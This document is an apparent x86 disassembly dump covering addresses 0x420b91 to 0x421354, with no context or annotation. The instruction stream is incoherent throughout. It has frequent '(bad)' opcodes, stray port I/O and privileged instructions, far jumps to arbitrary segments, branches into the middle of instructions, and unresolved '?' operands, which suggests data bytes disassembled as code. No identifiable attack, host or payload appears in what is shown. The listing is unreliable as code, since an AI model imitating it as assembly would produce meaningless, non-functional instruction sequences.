  420b91:	fucomi st,st(1)
  420b93:	imul   esi,DWORD PTR [edx],0xffffffce
  420b96:	out    dx,al
  420b97:	cmp    esp,DWORD PTR [edx]
  420b99:	mov    dl,0x66
  420b9b:	push   ds
  420b9c:	xchg   edx,eax
  420b9d:	gs lock jecxz 0x420b36
  420ba1:	lock pop ebp
  420ba3:	cli    
  420ba4:	mov    eax,edx
  420ba6:	mov    ds,ebx
  420ba8:	popf   
  420ba9:	sbb    bl,BYTE PTR [esi+ecx*4+0x70790e1d]
  420bb0:	push   0xffffff92
  420bb2:	jae    0x420b43
  420bb4:	sub    eax,0x6c575290
  420bb9:	push   edi
  420bba:	fldenv [edi+0x35144c3]
  420bc0:	lds    eax,FWORD PTR [eax]
  420bc2:	add    DWORD PTR ss:[esi],0xc40231fa
  420bc9:	or     DWORD PTR [ebx-0x1a],ebx
  420bcc:	outs   dx,BYTE PTR ds:[esi]
  420bcd:	fstp   QWORD PTR [ebx]
  420bcf:	sbb    edx,DWORD PTR [esi+ebx*1]
  420bd2:	or     al,0xbc
  420bd4:	les    ecx,FWORD PTR [edi-0x42]
  420bd7:	(bad)  
  420bd8:	fsubrp st(0),st
  420bda:	outs   dx,DWORD PTR ds:[esi]
  420bdb:	in     eax,0x22
  420bdd:	mov    ds:0xd505b7d1,eax
  420be2:	fcomp  DWORD PTR [esi-0x2b]
  420be5:	(bad)  
  420be6:	js     0x420c41
  420be8:	(bad)  
  420be9:	cdq    
  420bea:	xor    eax,0xc86ef5ce
  420bef:	and    DWORD PTR [esi+0x5c234ffe],0x71
  420bf6:	jo     0x420bbd
  420bf8:	adc    edi,DWORD PTR [edx+0x353d442d]
  420bfe:	outs   dx,DWORD PTR cs:[esi]
  420c00:	and    bh,BYTE PTR [edi-0x75]
  420c03:	mov    al,0x17
  420c05:	mov    cl,0x6b
  420c07:	lods   eax,DWORD PTR ds:[esi]
  420c08:	jbe    0x420c58
  420c0a:	add    BYTE PTR [eax],0xff
  420c0d:	mov    ds:0x845f0a4a,al
  420c12:	cmp    dh,al
  420c14:	jbe    0x420bee
  420c16:	loopne 0x420c38
  420c18:	jns    0x420c56
  420c1a:	lahf   
  420c1b:	push   ds
  420c1c:	or     eax,0x9b95eb1f
  420c21:	les    ebx,FWORD PTR [edx]
  420c23:	adc    esp,DWORD PTR [edi+0x1a]
  420c26:	je     0x420bcb
  420c28:	mov    dh,0xf4
  420c2a:	adc    edx,DWORD PTR [eax]
  420c2c:	ja     0x420c5b
  420c2e:	mov    BYTE PTR [esi+edx*8+0x7b73cf7],ch
  420c35:	or     BYTE PTR [edx-0x6],bh
  420c38:	frstor [ebx]
  420c3a:	cmp    ax,0xe0cf
  420c3e:	xchg   ebx,eax
  420c3f:	nop
  420c40:	test   edx,0xf8dffb3
  420c46:	retf   
  420c47:	stos   BYTE PTR es:[edi],al
  420c48:	add    cl,BYTE PTR [edi+0x513d2238]
  420c4e:	icebp  
  420c4f:	and    cl,dh
  420c51:	sahf   
  420c52:	jnp    0x420c44
  420c54:	int3   
  420c55:	aaa    
  420c56:	ins    BYTE PTR es:[edi],dx
  420c57:	jecxz  0x420cc9
  420c59:	sti    
  420c5a:	inc    edx
  420c5b:	cmp    DWORD PTR [esi+0x2a],esi
  420c5e:	dec    edi
  420c5f:	neg    BYTE PTR [edx]
  420c61:	push   ecx
  420c62:	pop    edx
  420c63:	sbb    DWORD PTR [esp+esi*1-0x1a],eax
  420c67:	cmc    
  420c68:	push   eax
  420c69:	xor    ebp,ebx
  420c6b:	inc    ecx
  420c6c:	ja     0x420c01
  420c6e:	mov    cl,0xa2
  420c70:	sbb    esp,edx
  420c72:	mov    ah,0x62
  420c74:	in     al,0xd7
  420c76:	outs   dx,DWORD PTR ds:[esi]
  420c77:	jbe    0x420c5d
  420c79:	xlat   BYTE PTR ds:[ebx]
  420c7a:	ror    BYTE PTR [ebx],1
  420c7c:	outs   dx,DWORD PTR ds:[esi]
  420c7d:	shl    DWORD PTR [eax],0xd
  420c80:	pop    ebx
  420c81:	inc    esi
  420c82:	gs add esp,edx
  420c85:	je     0x420c59
  420c87:	pop    edi
  420c88:	frstor [ecx-0x681c5fcd]
  420c8e:	lods   eax,DWORD PTR ds:[esi]
  420c8f:	es daa 
  420c91:	clc    
  420c92:	fild   DWORD PTR [ebp+edx*2+0x69b50ba5]
  420c99:	out    dx,al
  420c9a:	push   0xfffffff1
  420c9c:	popf   
  420c9d:	ret    0x3f0d
  420ca0:	hlt    
  420ca1:	inc    esp
  420ca2:	and    edi,DWORD PTR [ebp-0xc]
  420ca5:	jnp    0x420cb8
  420ca7:	or     ebx,ecx
  420ca9:	sbb    al,0x76
  420cab:	ja     0x420d1c
  420cad:	aas    
  420cae:	not    DWORD PTR ds:0x6d596a75
  420cb4:	gs cs jmp 0xcd3d809
  420cbb:	cwde   
  420cbc:	add    BYTE PTR [ebx],bl
  420cbe:	cdq    
  420cbf:	or     al,0x14
  420cc1:	(bad)  
  420cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cc3:	dec    esp
  420cc4:	(bad)  
  420cc5:	pop    esp
  420cc6:	clc    
  420cc7:	ss lock loopne 0x420d1c
  420ccb:	push   ebx
  420ccc:	adc    ah,BYTE PTR ds:0xa0fa3e61
  420cd2:	fucomip st,st(2)
  420cd4:	into   
  420cd5:	lods   al,BYTE PTR ds:[esi]
  420cd6:	enter  0xd34b,0x8e
  420cda:	add    BYTE PTR [ebp-0x126cb8b7],ch
  420ce0:	sub    BYTE PTR [eax-0x9e4c6c4],cl
  420ce6:	outs   dx,BYTE PTR ds:[esi]
  420ce7:	sub    DWORD PTR [esi+0x63194a8a],eax
  420ced:	jnp    0x420d3c
  420cef:	aas    
  420cf0:	inc    esp
  420cf1:	jecxz  0x420cce
  420cf3:	pop    esi
  420cf4:	push   0xc0bed4f9
  420cf9:	inc    ecx
  420cfa:	mov    DWORD PTR [ebp-0x17],edx
  420cfd:	aam    0xdd
  420cff:	sbb    esp,DWORD PTR [ebx-0x78db34b2]
  420d05:	sub    eax,0x42cbed56
  420d0a:	ret    0xbd2e
  420d0d:	mov    DWORD PTR [ebx-0x34],ebx
  420d10:	inc    ecx
  420d11:	xchg   esi,eax
  420d12:	inc    esi
  420d13:	ss pop ebp
  420d15:	cmp    DWORD PTR [ecx+0x54],0x63
  420d19:	outs   dx,BYTE PTR ds:[esi]
  420d1a:	pop    esi
  420d1b:	inc    ebp
  420d1c:	dec    esp
  420d1d:	mov    cl,0xbc
  420d1f:	mov    ah,dl
  420d21:	jmp    0xed80a7c9
  420d26:	aaa    
  420d27:	push   edx
  420d28:	call   0x5583:0x14b0bcba
  420d2f:	jle    0x420d8f
  420d31:	lods   al,BYTE PTR ds:[esi]
  420d32:	or     edx,DWORD PTR [eax]
  420d34:	cmp    al,BYTE PTR [ebp+0xf9b644b]
  420d3a:	jne    0x420d88
  420d3c:	mov    BYTE PTR [eax-0x6469bc3d],al
  420d42:	imul   edi,DWORD PTR [edi],0x36
  420d45:	cs cmp eax,0x9260d2e9
  420d4b:	add    edx,DWORD PTR [edi-0x24511fc]
  420d51:	sub    DWORD PTR [eax+edi*1+0x58],esi
  420d55:	xchg   ecx,eax
  420d56:	push   ss
  420d57:	inc    ebx
  420d58:	jne    0x420da6
  420d5a:	jnp    0x420d92
  420d5c:	fnstsw WORD PTR [esi+0x2c]
  420d5f:	cli    
  420d60:	sahf   
  420d61:	xor    eax,0x6a3f1a10
  420d66:	sti    
  420d67:	rol    cl,1
  420d69:	(bad)  
  420d6a:	push   edx
  420d6b:	mov    bh,0x4
  420d6d:	call   0xa41eb84f
  420d72:	jae    0x420d6f
  420d74:	jae    0x420d2f
  420d76:	adc    al,BYTE PTR [ebp+0x4c45a0d5]
  420d7c:	fimul  DWORD PTR [edx-0x7f]
  420d7f:	push   edx
  420d80:	scas   eax,DWORD PTR es:[edi]
  420d81:	jmp    0x420d3e
  420d83:	sub    al,0x3
  420d85:	into   
  420d86:	out    0x27,al
  420d88:	jo     0x420d5e
  420d8a:	push   ebp
  420d8b:	mov    ah,0xc6
  420d8d:	cmp    BYTE PTR [ecx+ecx*4],dl
  420d90:	pusha  
  420d91:	les    eax,FWORD PTR [esi+0x213e9e7]
  420d97:	mov    edi,0x885d39a4
  420d9c:	fld    QWORD PTR [edx-0x60e1f5f0]
  420da2:	test   eax,0xf36691eb
  420da7:	adc    eax,0xc4301387
  420dac:	xchg   ebp,eax
  420dad:	sbb    eax,0x10402642
  420db2:	adc    BYTE PTR [ecx],bl
  420db4:	neg    DWORD PTR [eax+0x4188b8f8]
  420dba:	mov    al,0x9f
  420dbc:	loop   0x420db2
  420dbe:	ret    0x75f4
  420dc1:	and    al,0xc2
  420dc3:	pusha  
  420dc4:	jmp    0x420e26
  420dc6:	dec    ebp
  420dc7:	lahf   
  420dc8:	test   eax,0x4cdc9bf
  420dcd:	inc    ecx
  420dce:	pcmpgtb xmm3,XMMWORD PTR [esi-0x5979e2ff]
  420dd6:	adc    BYTE PTR [ebx-0x6fd94b63],ch
  420ddc:	leave  
  420ddd:	add    DWORD PTR [esp+ebx*8-0x76],eax
  420de1:	adc    al,0x9e
  420de3:	jmp    0xfa8a5113
  420de8:	imul   DWORD PTR [ebp-0x59]
  420deb:	mov    al,ds:0x4312db23
  420df0:	in     al,0x10
  420df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420df3:	jmp    0x836b:0x8bc6c53e
  420dfa:	sahf   
  420dfb:	xchg   ecx,eax
  420dfc:	lods   eax,DWORD PTR ds:[esi]
  420dfd:	popa   
  420dfe:	fdivr  QWORD PTR [edi]
  420e00:	icebp  
  420e01:	dec    esi
  420e02:	pop    es
  420e03:	not    al
  420e05:	or     BYTE PTR [edx-0x3b],cl
  420e08:	sti    
  420e09:	shl    ch,1
  420e0b:	std    
  420e0c:	adc    edi,DWORD PTR [ebp-0x50]
  420e0f:	pop    ss
  420e10:	out    0xe2,al
  420e12:	or     esp,esi
  420e14:	aas    
  420e15:	dec    ecx
  420e16:	dec    ebx
  420e17:	jl     0x420e0e
  420e19:	mov    esi,0x3e84dc4b
  420e1e:	mov    bl,BYTE PTR [esi+0x383b67f8]
  420e24:	mov    WORD PTR [ecx+edx*2-0x45],ds
  420e28:	fdiv   DWORD PTR [edx]
  420e2a:	ret    
  420e2b:	aad    0x3
  420e2d:	xchg   esi,eax
  420e2e:	fwait
  420e2f:	mov    ecx,0xb4eeb43c
  420e34:	mov    eax,ds:0xa7685417
  420e39:	jne    0x420e77
  420e3b:	in     al,dx
  420e3c:	or     esi,ebx
  420e3e:	mov    ds:0xec1701e3,eax
  420e43:	xor    al,0x16
  420e45:	ja     0x420e96
  420e47:	jl     0x420de5
  420e49:	in     eax,dx
  420e4a:	mov    WORD PTR ds:0x5cdc8af2,gs
  420e50:	fimul  WORD PTR [edx+0x14]
  420e53:	jno    0x420e1b
  420e55:	lods   eax,DWORD PTR ds:[esi]
  420e56:	mov    ebx,0x64619632
  420e5b:	sbb    bh,BYTE PTR [ebx]
  420e5d:	mov    ebp,?
  420e5f:	jl     0x420e59
  420e61:	jb     0x420e94
  420e63:	cs inc eax
  420e65:	push   edi
  420e66:	nop
  420e67:	adc    al,al
  420e69:	xchg   ecx,eax
  420e6a:	mov    edx,0x1bdb9503
  420e6f:	inc    esp
  420e70:	inc    eax
  420e71:	outs   dx,BYTE PTR ds:[esi]
  420e72:	jne    0x420e33
  420e74:	pop    eax
  420e75:	js     0x420e9e
  420e77:	icebp  
  420e78:	aad    0x5f
  420e7a:	pop    esi
  420e7b:	sub    al,0xeb
  420e7d:	aad    0x6f
  420e7f:	popa   
  420e80:	sub    ebp,eax
  420e82:	shl    DWORD PTR [eax+edi*8+0x14],cl
  420e86:	ds sub dh,al
  420e89:	xor    dl,bh
  420e8b:	pop    ecx
  420e8c:	outs   dx,DWORD PTR ds:[esi]
  420e8d:	cmovg  ebx,esp
  420e90:	fucomi st,st(2)
  420e92:	xor    eax,0xc923335a
  420e97:	call   0xb7c4:0x79eba843
  420e9e:	inc    edi
  420e9f:	data16 xor al,0xf8
  420ea2:	xchg   ecx,eax
  420ea3:	fs ja  0x420e9c
  420ea6:	pop    edi
  420ea7:	and    ecx,esp
  420ea9:	dec    edx
  420eaa:	sub    eax,0x14867a6e
  420eaf:	(bad)  
  420eb1:	xor    eax,0x67b0d92b
  420eb6:	jno    0x420e51
  420eb8:	adc    DWORD PTR [ebx-0xc0c9839],ebx
  420ebe:	mov    ebp,0x7b5f481f
  420ec3:	inc    ebx
  420ec4:	test   BYTE PTR [ebp+0x74],dh
  420ec7:	xchg   esi,eax
  420ec8:	setns  BYTE PTR [edi]
  420ecb:	pop    ebp
  420ecc:	jl     0x420efd
  420ece:	mov    al,ds:0x87177c3
  420ed3:	(bad)  
  420ed4:	adc    DWORD PTR [eax-0x7a],eax
  420ed7:	jle    0x420f39
  420ed9:	fwait
  420eda:	sub    al,0xbb
  420edc:	stos   BYTE PTR es:[edi],al
  420edd:	mov    ds:0xae874714,eax
  420ee2:	arpl   WORD PTR [ecx],ax
  420ee4:	xchg   ecx,eax
  420ee5:	cli    
  420ee6:	enter  0xc206,0xb4
  420eea:	lods   al,BYTE PTR ds:[esi]
  420eeb:	(bad)  
  420eec:	gs shr ch,1
  420eef:	and    DWORD PTR [eax-0x13408566],esp
  420ef5:	jnp    0x420e79
  420ef7:	dec    ecx
  420ef8:	loopne 0x420ef7
  420efa:	mov    ch,0xc5
  420efc:	in     eax,0x38
  420efe:	and    bl,0xd4
  420f01:	ins    BYTE PTR es:[edi],dx
  420f02:	das    
  420f03:	adc    eax,0xc5b6ac03
  420f08:	push   es
  420f09:	pop    ss
  420f0a:	(bad)  
  420f0b:	jecxz  0x420f14
  420f0d:	ret    0x5210
  420f10:	push   ds
  420f11:	je     0x420ecd
  420f13:	int3   
  420f14:	inc    dh
  420f16:	not    BYTE PTR [ebx]
  420f18:	stos   BYTE PTR es:[edi],al
  420f19:	xchg   ebp,eax
  420f1a:	fs jne 0x420f67
  420f1d:	inc    esp
  420f1e:	push   es
  420f1f:	ss xor al,0x25
  420f22:	sbb    BYTE PTR [ebx+edx*8-0x31],ch
  420f26:	pop    ecx
  420f27:	retf   
  420f28:	push   0x9adfb285
  420f2d:	es stc 
  420f2f:	push   esp
  420f30:	sbb    eax,0x3df4ebaf
  420f35:	push   esp
  420f36:	push   ebx
  420f37:	dec    ebp
  420f38:	call   0x5d40eb17
  420f3d:	jp     0x420edd
  420f3f:	sar    BYTE PTR [edi+0x3ea3559f],cl
  420f45:	adc    al,0xf9
  420f47:	or     bl,ch
  420f49:	inc    ebp
  420f4a:	fs std 
  420f4c:	popf   
  420f4d:	jb     0x420f47
  420f4f:	lahf   
  420f50:	mov    esp,ecx
  420f52:	test   eax,0x42938497
  420f57:	imul   edi,DWORD PTR [ecx-0xa85f27],0xdac96048
  420f61:	in     al,dx
  420f62:	lea    ecx,[ecx]
  420f64:	mov    edx,ds
  420f66:	push   esp
  420f67:	repz mov edx,0xba2d921e
  420f6d:	std    
  420f6e:	push   0xffffff89
  420f70:	jb     0x420ef2
  420f72:	jp     0x420f86
  420f74:	inc    ebx
  420f75:	jecxz  0x420f73
  420f77:	imul   edi,DWORD PTR [edx],0x5f224ddf
  420f7d:	(bad)  
  420f7e:	mov    ebx,0x3863662a
  420f83:	push   edi
  420f84:	dec    esi
  420f85:	addr16 ret 0xb334
  420f89:	add    bl,BYTE PTR [ebx+ebp*1]
  420f8c:	sub    eax,0xc530ae0d
  420f91:	jnp    0x420fad
  420f93:	cmp    esp,edi
  420f95:	cmp    al,0x44
  420f97:	adc    DWORD PTR [eax+0x55b5395d],esi
  420f9d:	test   al,0xd4
  420f9f:	aad    0xbc
  420fa1:	push   ss
  420fa2:	inc    esi
  420fa3:	in     eax,dx
  420fa4:	sbb    ebx,eax
  420fa6:	push   0x45936cf7
  420fab:	cmp    bl,BYTE PTR gs:[ecx]
  420fae:	xchg   ecx,eax
  420faf:	ja     0x420f48
  420fb1:	mov    esi,0x98de4bf9
  420fb6:	sub    ebp,DWORD PTR [ebp+0x47df5574]
  420fbc:	sbb    DWORD PTR [ebp-0x69],eax
  420fbf:	iret   
  420fc0:	das    
  420fc1:	xchg   ebp,eax
  420fc2:	call   0x847c69b5
  420fc7:	and    ebp,edx
  420fc9:	(bad)  
  420fca:	mov    esi,0x347132ac
  420fcf:	mov    DWORD PTR [ebx+0x61],ebx
  420fd2:	gs add al,0x2b
  420fd5:	pop    eax
  420fd6:	clc    
  420fd7:	int3   
  420fd8:	rcr    DWORD PTR [edi],0x7c
  420fdb:	adc    bh,BYTE PTR [ebp-0x35]
  420fde:	xchg   DWORD PTR [esi+edx*8],ebx
  420fe1:	sar    DWORD PTR [eax],cl
  420fe3:	out    dx,al
  420fe4:	xor    ebp,DWORD PTR [edx]
  420fe6:	mov    dh,0xc
  420fe8:	jg     0x421008
  420fea:	scas   al,BYTE PTR es:[edi]
  420feb:	xchg   ecx,eax
  420fec:	fs mov esp,0xde44d25e
  420ff2:	jge    0x421071
  420ff4:	aad    0x15
  420ff6:	stos   DWORD PTR es:[edi],eax
  420ff7:	lds    edi,FWORD PTR [ebx-0x2ff78936]
  420ffd:	cld    
  420ffe:	aam    0x9b
  421000:	add    esp,DWORD PTR [ecx]
  421002:	cs std 
  421004:	js     0x42102b
  421006:	jmp    0x530:0xffc898e9
  42100d:	mov    eax,ds:0xc321d9b3
  421012:	shr    bh,cl
  421014:	sbb    DWORD PTR [edx-0x3b],ebp
  421017:	scas   eax,DWORD PTR es:[edi]
  421018:	sub    al,0xf2
  42101a:	lds    esi,FWORD PTR [ebx-0x27]
  42101d:	cmc    
  42101e:	mov    BYTE PTR [esi],0x1c
  421021:	xor    eax,0x86463d0e
  421026:	rcr    BYTE PTR [edx],0x2d
  421029:	adc    BYTE PTR [esp+edx*1],0xf0
  42102d:	push   0x9064d3e
  421032:	jl     0x420fe3
  421034:	imul   edx,DWORD PTR [edx+0x4],0xffffffc5
  421038:	out    0x51,al
  42103a:	retf   
  42103b:	std    
  42103c:	inc    ecx
  42103d:	out    dx,eax
  42103e:	sub    eax,0x3aa92b2d
  421043:	push   esi
  421044:	jno    0x421031
  421046:	fbld   TBYTE PTR [edx]
  421048:	sbb    ch,BYTE PTR [esi+ecx*1+0x6de04a38]
  42104f:	test   al,0xc2
  421051:	nop
  421052:	dec    ecx
  421053:	mov    DWORD PTR [ebx],edi
  421055:	dec    ebx
  421056:	xchg   edx,eax
  421057:	adc    DWORD PTR [ebx+esi*4],esp
  42105a:	cmc    
  42105b:	jne    0x421016
  42105d:	sbb    BYTE PTR [eax-0x34],dh
  421060:	or     BYTE PTR [ebp+edx*4+0x7af0a4b7],dl
  421067:	loope  0x420feb
  421069:	pop    ebp
  42106a:	aad    0xb9
  42106c:	inc    ecx
  42106d:	int3   
  42106e:	jmp    0x4210b2
  421070:	jmp    0x421037
  421072:	inc    edi
  421073:	xor    DWORD PTR [esi+0x1d],ebx
  421076:	test   DWORD PTR [ebx+0x27a41f9],ebx
  42107c:	fisubr WORD PTR [esi]
  42107e:	and    edi,DWORD PTR [ebx-0x336b07b8]
  421084:	push   ds
  421085:	sub    DWORD PTR [edi+0x2a],0x1f
  421089:	test   al,0x90
  42108b:	adc    BYTE PTR [ebx],0xa3
  42108e:	adc    DWORD PTR [ecx+0x3056da64],ebx
  421094:	aas    
  421095:	pop    esp
  421096:	xchg   ecx,eax
  421097:	add    esp,DWORD PTR [ebx-0x78928e45]
  42109d:	aas    
  42109e:	data16 sub BYTE PTR [bx+si],bl
  4210a2:	dec    ecx
  4210a3:	leave  
  4210a4:	jmp    0x421094
  4210a6:	cli    
  4210a7:	ror    DWORD PTR [edx-0x1b24671b],0x47
  4210ae:	mov    al,ds:0xeeeeefaa
  4210b3:	mov    ch,0xb
  4210b5:	mov    ch,0x96
  4210b7:	fdivr  QWORD PTR [ebx-0x75]
  4210ba:	(bad)  
  4210bb:	pop    esi
  4210bc:	push   ecx
  4210bd:	sub    bh,BYTE PTR [edx+0x64]
  4210c0:	(bad)  
  4210c1:	mov    ch,0x7c
  4210c3:	fwait
  4210c4:	xor    DWORD PTR [edi],esi
  4210c6:	arpl   bp,bp
  4210c8:	leave  
  4210c9:	(bad)  [ecx]
  4210cb:	pop    eax
  4210cc:	push   ss
  4210cd:	and    eax,0x433e1fc7
  4210d2:	xchg   DWORD PTR ss:[esp+edx*4-0x56b88187],esi
  4210da:	push   edi
  4210db:	push   cs
  4210dc:	jge    0x4210d3
  4210de:	idiv   al
  4210e0:	xor    BYTE PTR [edx],al
  4210e2:	aad    0xaf
  4210e4:	(bad)  
  4210e5:	ror    DWORD PTR [esi+0x40],1
  4210e8:	popf   
  4210e9:	mov    bl,BYTE PTR [ebx-0x26]
  4210ec:	or     eax,0x59696611
  4210f1:	sub    esi,ecx
  4210f3:	add    ebp,DWORD PTR [edi-0x7d]
  4210f6:	loop   0x4210bd
  4210f8:	ds out 0x12,eax
  4210fb:	dec    ebx
  4210fc:	(bad)  
  4210fd:	ror    DWORD PTR [eax-0x79367e6b],1
  421103:	jge    0x421133
  421105:	push   es
  421106:	stos   BYTE PTR es:[edi],al
  421107:	push   esp
  421108:	icebp  
  421109:	sti    
  42110a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42110b:	mov    esp,0x70e66d36
  421110:	xchg   ebx,eax
  421111:	stc    
  421112:	out    0xf7,eax
  421114:	jp     0x4210ec
  421116:	and    DWORD PTR [edi],edi
  421118:	test   ah,dl
  42111a:	and    eax,0x32997415
  42111f:	pop    ebp
  421120:	int    0xac
  421122:	int3   
  421123:	xor    bl,BYTE PTR [eax]
  421125:	mov    esi,0x9051d021
  42112a:	stc    
  42112b:	xlat   BYTE PTR ds:[ebx]
  42112c:	adc    al,0xf1
  42112e:	into   
  42112f:	mov    bl,0x9
  421131:	sti    
  421132:	in     eax,0x28
  421134:	aam    0xcc
  421136:	repz sub edi,DWORD PTR [esi]
  421139:	je     0x421197
  42113b:	pop    edi
  42113c:	leave  
  42113d:	push   ss
  42113e:	inc    ebp
  42113f:	push   ecx
  421140:	mov    bh,0x2
  421142:	daa    
  421143:	daa    
  421144:	dec    eax
  421145:	fild   DWORD PTR ds:0x17e241e3
  42114b:	sub    edi,DWORD PTR [ebx+edi*1]
  42114e:	sub    DWORD PTR [ebp-0x11],edx
  421151:	leave  
  421152:	ins    BYTE PTR es:[edi],dx
  421153:	retf   0x5124
  421156:	sub    bl,BYTE PTR [edi-0x33edee84]
  42115c:	adc    ah,0x33
  42115f:	hlt    
  421160:	push   cs
  421161:	sbb    cl,cl
  421163:	jge    0x4210f2
  421165:	js     0x42111f
  421167:	jo     0x42117f
  421169:	xchg   esi,eax
  42116a:	pop    eax
  42116b:	mov    esp,0xbe3f1e1
  421170:	cdq    
  421171:	sub    edx,ecx
  421173:	leave  
  421174:	jns    0x421135
  421176:	sbb    eax,0xf2e4a4bd
  42117b:	sub    edx,DWORD PTR [edx]
  42117d:	dec    ecx
  42117e:	enter  0x5afb,0xb6
  421182:	cli    
  421183:	mov    ebp,DWORD PTR ds:0xe7a3721a
  421189:	loope  0x421150
  42118b:	sub    edx,DWORD PTR [ecx]
  42118d:	push   ecx
  42118e:	int    0x7e
  421190:	push   0xffffff83
  421192:	mov    edx,0xd4fd186d
  421197:	mov    al,ds:0x2766580b
  42119c:	sub    bh,BYTE PTR [edx-0x33]
  42119f:	mov    ds:0x61c8850b,al
  4211a4:	in     eax,dx
  4211a5:	push   0xffffffb7
  4211a7:	mov    ebx,edi
  4211a9:	cli    
  4211aa:	les    ebp,FWORD PTR [ebp+0x79]
  4211ad:	popf   
  4211ae:	jge    0x4211c6
  4211b0:	das    
  4211b1:	jmp    0xf6c7:0x42feb28a
  4211b8:	or     al,0xc1
  4211ba:	xor    DWORD PTR [edx],edx
  4211bc:	in     al,dx
  4211bd:	rcr    DWORD PTR [edi+edi*1-0x790ef87b],0xfa
  4211c5:	adc    al,0x1e
  4211c7:	and    DWORD PTR [eax+0x6e63a873],eax
  4211cd:	ins    BYTE PTR es:[edi],dx
  4211ce:	adc    dh,BYTE PTR [eax]
  4211d0:	int3   
  4211d1:	inc    ecx
  4211d2:	sub    al,0x7b
  4211d4:	xchg   ecx,eax
  4211d5:	mov    ecx,0xc63b3911
  4211da:	jae    0x4211eb
  4211dc:	(bad)  
  4211dd:	out    dx,al
  4211de:	mov    eax,0xfac62b57
  4211e3:	mov    ebx,0x606a5f9c
  4211e8:	(bad)  
  4211ea:	mov    ecx,0x640117f9
  4211ef:	adc    edi,DWORD PTR [esi-0x6c]
  4211f2:	xor    BYTE PTR [ecx+0x1432dedb],0x9a
  4211f9:	out    0x4d,al
  4211fb:	mov    ds:0x1892934f,eax
  421200:	(bad)  
  421201:	fist   DWORD PTR [ebp+0x62dc24b2]
  421207:	stos   DWORD PTR es:[edi],eax
  421208:	imul   ebx,ebp,0x6c
  42120b:	fnstenv [eax-0x31]
  42120e:	out    dx,al
  42120f:	ret    
  421210:	mov    ebx,DWORD PTR [edx-0x30]
  421213:	fucomi st,st(2)
  421215:	push   ecx
  421216:	stos   BYTE PTR es:[edi],al
  421217:	cmp    al,0xa4
  421219:	jl     0x421275
  42121b:	adc    BYTE PTR [eax],ch
  42121d:	test   BYTE PTR [ebp-0x53],ah
  421220:	popf   
  421221:	xchg   esp,eax
  421222:	and    DWORD PTR [edi*2-0x4752240a],esp
  421229:	popf   
  42122a:	xor    eax,esi
  42122c:	xchg   ebx,eax
  42122d:	loop   0x4211c9
  42122f:	enter  0x337c,0x8b
  421233:	jae    0x4211ca
  421235:	dec    ebx
  421236:	dec    ebp
  421237:	rcr    BYTE PTR [ecx+0x4c],1
  42123a:	inc    ebp
  42123b:	daa    
  42123c:	pop    ebp
  42123d:	leave  
  42123e:	pushf  
  42123f:	sbb    DWORD PTR [ecx],edx
  421241:	or     esi,esp
  421243:	fidiv  DWORD PTR [esi]
  421245:	popf   
  421246:	and    DWORD PTR [esi+ecx*4],0x2e34bd2d
  42124d:	jg     0x421266
  42124f:	imul   ebx,DWORD PTR [ecx],0x56
  421252:	retf   
  421253:	mov    dl,0x9d
  421255:	in     al,dx
  421256:	cmp    bl,BYTE PTR [ebx-0x3011a8a6]
  42125c:	test   eax,0xf0319a02
  421261:	xchg   DWORD PTR [edx+0xb],esp
  421264:	out    0x0,al
  421266:	fs add eax,0x44b7b366
  42126c:	jle    0x421279
  42126e:	sub    eax,0xae46f902
  421273:	push   cs
  421274:	sbb    eax,0xfa01bbf8
  421279:	stos   BYTE PTR es:[edi],al
  42127a:	jnp    0x421260
  42127c:	(bad)  
  42127e:	pop    ebp
  42127f:	or     eax,0x705baee4
  421284:	into   
  421285:	(bad)  
  421286:	add    ch,BYTE PTR [ecx]
  421288:	xchg   esp,eax
  421289:	add    al,0x39
  42128b:	lods   eax,DWORD PTR ds:[esi]
  42128c:	fwait
  42128d:	mov    eax,0x4ff6c54e
  421292:	jbe    0x421228
  421294:	xlat   BYTE PTR ds:[ebx]
  421295:	push   esp
  421296:	mov    ds:0x9d7b294c,al
  42129b:	lods   al,BYTE PTR ds:[esi]
  42129c:	jge    0x42122b
  42129e:	adc    al,cl
  4212a0:	adc    BYTE PTR [edi-0x564f0082],al
  4212a6:	test   eax,0xdf759992
  4212ab:	stc    
  4212ac:	ds jp  0x421233
  4212af:	cmp    ebp,DWORD PTR [ebx+edi*1-0x72]
  4212b3:	std    
  4212b4:	daa    
  4212b5:	call   0x1c9a2ba4
  4212ba:	enter  0x4ca,0xcf
  4212be:	dec    ebx
  4212bf:	pop    edx
  4212c0:	inc    ebp
  4212c1:	popa   
  4212c2:	punpcklbw mm5,mm2
  4212c5:	mov    ebx,0xa106ca36
  4212ca:	inc    edx
  4212cb:	sbb    DWORD PTR [edi-0x39],edx
  4212ce:	mov    ?,WORD PTR [ecx]
  4212d0:	pop    ebp
  4212d1:	xor    eax,0x354229ab
  4212d6:	daa    
  4212d7:	adc    eax,0xca53926c
  4212dc:	das    
  4212dd:	jns    0x4212c3
  4212df:	inc    eax
  4212e0:	fisubr WORD PTR [edx]
  4212e2:	mov    edx,0xb604006e
  4212e7:	test   eax,0x5e17e07
  4212ec:	xor    ah,ah
  4212ee:	call   0x716899c8
  4212f3:	fidiv  DWORD PTR [ecx]
  4212f5:	lods   eax,DWORD PTR ds:[esi]
  4212f6:	jmp    0x4212c5
  4212f8:	pusha  
  4212f9:	adc    ebp,DWORD PTR ds:0xe29e859e
  4212ff:	pop    eax
  421300:	fwait
  421301:	cdq    
  421302:	leave  
  421303:	jns    0x421344
  421305:	xor    ecx,DWORD PTR [ecx-0x668f187b]
  42130b:	rol    edx,0x3c
  42130e:	jo     0x4212b7
  421310:	fucomip st,st(2)
  421312:	or     al,ah
  421314:	jmp    0x9734e1fd
  421319:	fucomi st,st(0)
  42131b:	add    al,0xcf
  42131d:	sub    BYTE PTR [eax+ecx*4-0x1c36caa0],ah
  421324:	sub    ebp,ebx
  421326:	cmp    BYTE PTR [ebx],ch
  421328:	mov    ebp,0xed88f13e
  42132d:	aad    0x5c
  42132f:	add    ch,BYTE PTR [eax-0x17]
  421332:	jb     0x421338
  421334:	inc    ecx
  421335:	add    BYTE PTR [edi],al
  421337:	inc    ebp
  421338:	xor    eax,0xa27ae97
  42133d:	ja     0x421333
  42133f:	fnstsw WORD PTR [eax+0x72b20a72]
  421345:	xchg   esi,eax
  421346:	xchg   DWORD PTR [esi+ebp*8],ebx
  421349:	and    al,0xc
  42134b:	fnstenv [ecx]
  42134d:	jae    0x4212f7
  42134f:	add    eax,0x65f45cc
  421354:	ins    DWORD PTR es:[edi],dx
